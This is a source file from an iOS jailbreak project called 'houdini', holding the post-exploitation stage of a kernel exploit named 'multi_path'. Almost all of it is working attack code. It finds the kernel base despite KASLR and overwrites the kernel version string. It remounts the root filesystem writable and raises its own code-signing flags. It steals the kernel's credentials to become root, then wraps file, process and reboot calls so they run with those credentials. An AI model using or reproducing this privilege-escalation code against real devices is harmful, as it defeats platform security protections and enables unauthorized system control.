//
//  multi_path_strategy.m
//  houdini
//
//  Created by Abraham Masri on 12/7/17.
//  Copyright © 2018 cheesecakeufo. All rights reserved.
//
//
#import <Foundation/Foundation.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <sys/utsname.h>
#include <stdlib.h>
#include <spawn.h>
#include <sys/dirent.h>

#include "strategy_control.h"
#include "multi_path_strategy.h"
#include "multi_path_sploit.h"
#include "multi_path_offsets.h"
//#include "kernelversionhacker.h"

#include "patchfinder64.h"

extern uint64_t our_proc;
extern uint64_t our_cred;
extern uint64_t kernel_base;
extern uint64_t kaslr_slide;

extern uint64_t multi_path_rk64(uint64_t kaddr);
extern uint32_t multi_path_rk32(uint64_t kaddr);

#ifdef __arm64__
#define IMAGE_OFFSET 0x2000
#define MACHO_HEADER_MAGIC 0xfeedfacf
#define MAX_KASLR_SLIDE 0x21000000
#define KERNEL_SEARCH_ADDRESS_IOS10 0xfffffff007004000
#define KERNEL_SEARCH_ADDRESS_IOS9 0xffffff8004004000
#define KERNEL_SEARCH_ADDRESS_IOS 0xffffff8000000000
#else
#define IMAGE_OFFSET 0x1000
#define MACHO_HEADER_MAGIC 0xfeedface
#define KERNEL_SEARCH_ADDRESS_IOS 0x81200000
#define KERNEL_SEARCH_ADDRESS_IPHONEOS 0xC0000000
#endif

#define ptrSize sizeof(uintptr_t)

task_t get_kernel_task() {
    task_t kt = 0;
    kern_return_t r = task_for_pid(mach_task_self(), 0, &kt);
    
    if (r) {
        r = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &kt);
        if (r) {
            printf("task_for_pid and host_get_special_port failed\n");
            exit(-1);
        }
    }
    
    return kt;
}

static vm_address_t get_kernel_base(task_t kernel_task, uint64_t osRelease) {
    vm_region_submap_info_data_64_t info;
    vm_size_t size;
    mach_msg_type_number_t info_count = VM_REGION_SUBMAP_INFO_COUNT_64;
    unsigned int depth = 0;
    
    uintptr_t addr = 0;
    
#ifdef __arm__
    if (osRelease <= 10) {
        addr = KERNEL_SEARCH_ADDRESS_IPHONEOS;
        return addr;
    }
    else {
        addr = KERNEL_SEARCH_ADDRESS_IOS;
    }
#elif __arm64__
    addr = KERNEL_SEARCH_ADDRESS_IOS;
#endif
    
    while (1) {
        
        char *buf;
        mach_msg_type_number_t sz = 0;
        if (KERN_SUCCESS != vm_region_recurse_64(kernel_task, (vm_address_t *)&addr, &size, &depth, (vm_region_info_t) &info, &info_count)) {
            continue;
        }
        
        if ((size > 1024*1024*1024)) {
            /*
             * https://code.google.com/p/iphone-dataprotection/
             * hax, sometimes on iOS7 kernel starts at +0x200000 in the 1Gb region
             */
            pointer_t buf;
            mach_msg_type_number_t sz = 0;
            addr += 0x200000;
            
            vm_read(kernel_task, addr + IMAGE_OFFSET, 512, &buf, &sz);
            if (*((uint32_t *)buf) != MACHO_HEADER_MAGIC) {
                addr -= 0x200000;
                vm_read(kernel_task, addr + IMAGE_OFFSET, 512, &buf, &sz);
                if (*((uint32_t*)buf) != MACHO_HEADER_MAGIC) {
                    break;
                }
            }
            
            return addr+IMAGE_OFFSET;
        }
        addr+=size;
    }
    printf("ERROR: Failed to find kernel base.\n");
    exit(1);
}

#ifdef __arm64__
static vm_address_t get_kernel_baseios9plus(mach_port_t kernel_task, uint64_t osRelease) {
    uint64_t addr = 0;
    
    /* iOS 10 and 11 share the same default kernel slide */
    if (osRelease == 16 || osRelease == 17) {
        addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;
    }
    
    else if (osRelease == 15) {
        addr = KERNEL_SEARCH_ADDRESS_IOS9+MAX_KASLR_SLIDE;
    }
    
    else if (osRelease >= 18) {
        printf("This is an unknown kernel version, trying iOS 10/11 default address. If you panic, this is probably the cause\n");
        addr = KERNEL_SEARCH_ADDRESS_IOS10+MAX_KASLR_SLIDE;
    }
    
    /* This function shouldn't be getting called on iOS 8 or lower */
    else return -1;
    
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(kernel_task, addr, 0x200, (vm_offset_t*)&buf, &sz);
        
        if (ret) {
            goto next;
        }
        
        if (*((uint32_t *)buf) == MACHO_HEADER_MAGIC) {
            int ret = vm_read(kernel_task, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                printf("Failed vm_read %i\n", ret);
                goto next;
            }
            
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(ptrSize)) {
                mach_msg_type_number_t sz;
                int ret = vm_read(kernel_task, i, 0x120, (vm_offset_t*)&buf, &sz);
                
                if (ret != KERN_SUCCESS) {
                    printf("Failed vm_read %i\n", ret);
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }
        
    next:
        addr -= 0x200000;
    }
    
    printf("ERROR: Failed to find kernel base.\n");
    exit(1);
}
#endif

#define DEFAULT_VERSION_STRING "hacked"

int updateVersionString(char *newVersionString) {
    uintptr_t versionPtr = 0;
    struct utsname u = {0};
    uname(&u);
    
    mach_port_t kernel_task = get_kernel_task();
    
    vm_address_t kernel_base;
    
    uint64_t osRelease = strtol(u.release, NULL, 0);
#ifdef __arm64__
    if (osRelease >= 15) {
        kernel_base = get_kernel_baseios9plus(kernel_task, osRelease);
    }
    else  {
        kernel_base = get_kernel_base(kernel_task, osRelease);
    }
#elif __arm__
    kernel_base = get_kernel_base(kernel_task, osRelease);
#endif
    
    uintptr_t darwinTextPtr = 0;
    
    char *buf;
    
    vm_size_t sz;
    uintptr_t TEXT_const = 0;
    uint32_t sizeofTEXT_const = 0;
    uintptr_t DATA_data = 0;
    uint32_t sizeofDATA_data = 0;
    
    char *sectName;
#ifdef __arm__
    /* iOS 4 and below have the kernel version text in __TEXT_cstring */
    if (osRelease <= 11) {
        sectName = "__cstring";
    }
    else sectName = "__const";
#elif __arm64__
    sectName = "__const";
#endif
    
    for (uintptr_t i=kernel_base; i < (kernel_base+0x2000); i+=(ptrSize)) {
        int ret = vm_read(kernel_task, i, 0x150, (vm_offset_t*)&buf, (mach_msg_type_number_t*)&sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            exit(-1);
        }
        
        if (!strcmp(buf, sectName) && !strcmp(buf+0x10, "__TEXT")) {
            TEXT_const = *(uintptr_t*)(buf+0x20);
            sizeofTEXT_const = *(uintptr_t*)(buf+(0x20 + ptrSize));
            
        }
        
        else if (!strcmp(buf, "__data") && !strcmp(buf+0x10, "__DATA")) {
            DATA_data = *(uintptr_t*)(buf+0x20);
            sizeofDATA_data = *(uintptr_t*)(buf+(0x20 + ptrSize));
        }
        
        if (TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)
            break;
    }
    
    if (!(TEXT_const && sizeofTEXT_const && DATA_data && sizeofDATA_data)) {
        printf("Error parsing kernel macho\n");
        return -1;
    }
    
    for (uintptr_t i = TEXT_const; i < (TEXT_const+sizeofTEXT_const); i += 2)
    {
        int ret = vm_read_overwrite(kernel_task, i, strlen("Darwin Kernel Version"), (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        if (!memcmp(buf, "Darwin Kernel Version", strlen("Darwin Kernel Version"))) {
            darwinTextPtr = i;
            break;
        }
    }
    
    if (!darwinTextPtr) {
        printf("Error finding Darwin text\n");
        return -1;
    }
    
    uintptr_t versionTextXref[ptrSize];
    versionTextXref[0] = darwinTextPtr;
    
    for (uintptr_t i = DATA_data; i < (DATA_data+sizeofDATA_data); i += ptrSize) {
        int ret = vm_read_overwrite(kernel_task, i, ptrSize, (vm_address_t)buf, &sz);
        if (ret != KERN_SUCCESS) {
            printf("Failed vm_read %i\n", ret);
            return -1;
        }
        
        if (!memcmp(buf, versionTextXref, ptrSize)) {
            versionPtr = i;
            break;
        }
    }
    
    if (!versionPtr) {
        printf("Error finding _version pointer, did you already patch it?\n");
        return -1;
    }
    
    kern_return_t ret;
    vm_address_t newStringPtr = 0;
    vm_allocate(kernel_task, &newStringPtr, strlen(newVersionString), VM_FLAGS_ANYWHERE);
    
    ret = vm_write(kernel_task, newStringPtr, (vm_offset_t)newVersionString, strlen(newVersionString));
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        exit(-1);
    }
    
    ret = vm_write(kernel_task, versionPtr, (vm_offset_t)&newStringPtr, ptrSize);
    if (ret != KERN_SUCCESS) {
        printf("Failed vm_write %i\n", ret);
        return -1;
    }
    else {
        memset(&u, 0x0, sizeof(u));
        uname(&u);
        return 0;
    }
}

/*
 *  Purpose: mounts rootFS as read/write (workaround by @SparkZheng)
 */
kern_return_t multi_path_mount_rootfs() {
    
    kern_return_t ret = KERN_SUCCESS;
    
    // slide = base - 0xfffffff007004000
//    prepare_for_rw_with_fake_tfp0();
    kernel_base = get_kernel_baseios9plus(tfp0, 17);
    
    printf("[INFO]: passing kernel_base: %llx\n", kernel_base);
    kaslr_slide = kernel_base - 0xfffffff007004000;
    printf("[INFO]: kaslr_slide: %llx\n", kaslr_slide);
    
    int rv = init_kernel(kernel_base, NULL);
    
    if(rv != 0) {
        printf("[ERROR]: could not initialize kernel\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    printf("[INFO]: sucessfully initialized kernel\n");
    
    char *dev_path = "/dev/disk0s1s1";
//    uint64_t dev_vnode = getVnodeAtPath(devpath);
    
    uint64_t rootvnode = find_rootvnode();
    printf("[INFO]: _rootvnode: %llx (%llx)\n", rootvnode, rootvnode - kaslr_slide);
    
    if(rootvnode == 0) {
        ret = KERN_FAILURE;
        return ret;
    }
    
    uint64_t rootfs_vnode = kread_uint64(rootvnode);
    printf("[INFO]: rootfs_vnode: %llx\n", rootfs_vnode);
    
    uint64_t v_mount = kread_uint64(rootfs_vnode + 0xd8);
    printf("[INFO]: v_mount: %llx (%llx)\n", v_mount, v_mount - kaslr_slide);
    
    uint32_t v_flag = kread_uint32(v_mount + 0x71);
    printf("[INFO]: v_flag: %x (%llx)\n", v_flag, v_flag - kaslr_slide);
    
    kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
    
    
    multi_path_post_exploit(); // set our uid

    return ret;
}



// kickstarts the exploit
kern_return_t multi_path_start () {
    
    kern_return_t ret = multi_path_go();
    
    if(ret != KERN_SUCCESS)
        return KERN_FAILURE;
    
    // get kernel_task
    extern uint64_t kernel_task;
    kernel_task = multi_path_get_proc_with_pid(0, false);
    printf("kernel_task: %llx\n", kernel_task);
    
    // give ourselves power
    our_proc = multi_path_get_proc_with_pid(getpid(), false);
    uint32_t csflags = kread_uint32(our_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */);
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD);
    kwrite_uint32(our_proc + 0x2a8 /* KSTRUCT_OFFSET_CSFLAGS */, csflags);
    multi_path_mount_rootfs();

    return ret;
}

// called after multi_path_start
kern_return_t multi_path_post_exploit () {
    
    kern_return_t ret = KERN_SUCCESS;
    
    if(our_proc == 0)
        our_proc = multi_path_get_proc_with_pid(getpid(), false);
    
    if(our_proc == -1) {
        printf("[ERROR]: no our proc. wut\n");
        ret = KERN_FAILURE;
        return ret;
    }
    
    extern uint64_t kernel_task;
    uint64_t kern_ucred = kread_uint64(kernel_task + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    
    if(our_cred == 0)
        our_cred = kread_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
    
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, kern_ucred);
    
    printf("[INFO]: our proc: %llu\n", our_proc);
    printf("[INFO]: our cred: %llu\n", our_cred);
    printf("[INFO]: old uid: %u", getuid());
    
    setuid(0);
    
    printf("[INFO]: new uid: %u\n", getuid());
//    multi_path_get_proc_with_pid(getpid(), false);

//    multi_path_mkdir("/twilight");

    char *twilight = "/twilight";
    multi_path_mkdir(twilight);
    char *list = "/";
    multi_path_ls(list);
    char *twilight2 = "/var/twilight";
    multi_path_mkdir(twilight2);
    char *list2 = "/var";
    multi_path_ls(list2);
    
    return ret;
}

/*
 *  Purpose: used as a workaround in iOS 11 (temp till I fix the sandbox panic issue)
 */
void multi_path_set_cred_back () {
    kwrite_uint64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, our_cred);
}

void multi_path_mkdir (char *path) {

    multi_path_post_exploit();
    mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
    multi_path_set_cred_back();
}

void multi_path_ls (char *path) {
    multi_path_post_exploit();
//    mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
    DIR *d;
    struct dirent *dir;
    d = opendir(path);
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            printf("%s\n", dir->d_name);
        }
        closedir(d);
    }
    multi_path_set_cred_back();
}

void multi_path_rename (const char *old, const char *new) {

    multi_path_post_exploit();
    rename(old, new);
    multi_path_set_cred_back();
}


void multi_path_unlink (char *path) {

    multi_path_post_exploit();
    unlink(path);
    multi_path_set_cred_back();
}

int multi_path_chown (const char *path, uid_t owner, gid_t group) {
    
    multi_path_post_exploit();
    int ret = chown(path, owner, group);
    multi_path_set_cred_back();
    return ret;
}


int multi_path_chmod (const char *path, mode_t mode) {
    
    multi_path_post_exploit();
    int ret = chmod(path, mode);
    multi_path_set_cred_back();
    return ret;
}


int multi_path_open (const char *path, int oflag, mode_t mode) {
    
    multi_path_post_exploit();
    int fd = open(path, oflag, mode);
    multi_path_set_cred_back();
    
    return fd;
}

void multi_path_kill (pid_t pid, int sig) {
    
    multi_path_post_exploit();
    kill(pid, sig);
    multi_path_set_cred_back();
}


void multi_path_reboot () {
    multi_path_post_exploit();
    reboot(0);
}



void multi_path_posix_spawn (char * path) {


}


/*
 * Purpose: iterates over the procs and finds a pid with given name
 */
pid_t multi_path_pid_for_name(char *name) {
    
    extern uint64_t task_port_kaddr;
    uint64_t struct_task = multi_path_rk64(task_port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));

    
    while (struct_task != 0) {
        uint64_t bsd_info = multi_path_rk64(struct_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        if(bsd_info <= 0)
            return -1; // fail!
        
        if (((bsd_info & 0xffffffffffffffff) != 0xffffffffffffffff)) {
            
            char comm[MAXCOMLEN + 1];
            kread(bsd_info + 0x268 /* KSTRUCT_OFFSET_PROC_COMM */, comm, 17);
            printf("name: %s\n", comm);
            
            if(strcmp(name, comm) == 0) {
                
                // get the process pid
                uint32_t pid = multi_path_rk32(bsd_info + multi_path_koffset(KSTRUCT_OFFSET_PROC_PID));
                return (pid_t)pid;
            }
        }
        
        struct_task = multi_path_rk64(struct_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_PREV));
        
        if(struct_task == -1)
            return -1;
    }
    return -1; // we failed :/
}




// returns the multi_path strategy with its functions
strategy _multi_path_strategy () {
    
    strategy returned_strategy;
    
    memset(&returned_strategy, 0, sizeof(returned_strategy));
    
    returned_strategy.strategy_start = &multi_path_start;
    returned_strategy.strategy_post_exploit = &multi_path_post_exploit;
    
    returned_strategy.strategy_mkdir = &multi_path_mkdir;
    returned_strategy.strategy_rename = &multi_path_rename;
    returned_strategy.strategy_unlink = &multi_path_unlink;
    
    returned_strategy.strategy_chown = &multi_path_chown;
    returned_strategy.strategy_chmod = &multi_path_chmod;
    
    returned_strategy.strategy_open = &multi_path_open;
    
    returned_strategy.strategy_kill = &multi_path_kill;
    returned_strategy.strategy_reboot = &multi_path_reboot;

//    returned_strategy.strategy_posix_spawn = &multi_path_posix_spawn;
    returned_strategy.strategy_pid_for_name = &multi_path_pid_for_name;
    
    
    return returned_strategy;
}


// custom multi_path stuff

/*
 * Purpose: iterates over the procs and finds a proc with given pid
 */
uint64_t multi_path_get_proc_with_pid(pid_t target_pid, int spawned) {

    extern uint64_t task_port_kaddr;
    uint64_t struct_task = multi_path_rk64(task_port_kaddr + multi_path_koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));

    printf("our pid: %x\n", target_pid);

    while (struct_task != 0) {
        uint64_t bsd_info = multi_path_rk64(struct_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        // get the process pid
        uint32_t pid = multi_path_rk32(bsd_info + multi_path_koffset(KSTRUCT_OFFSET_PROC_PID));
        
        printf("pid: %x\n", pid);

        if(pid == target_pid) {
            return bsd_info;
        }

        if(spawned) // spawned binaries will exist AFTER our task
            struct_task = multi_path_rk64(struct_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_NEXT));
        else
            struct_task = multi_path_rk64(struct_task + multi_path_koffset(KSTRUCT_OFFSET_TASK_PREV));

    }
    return -1; // we failed :/
}

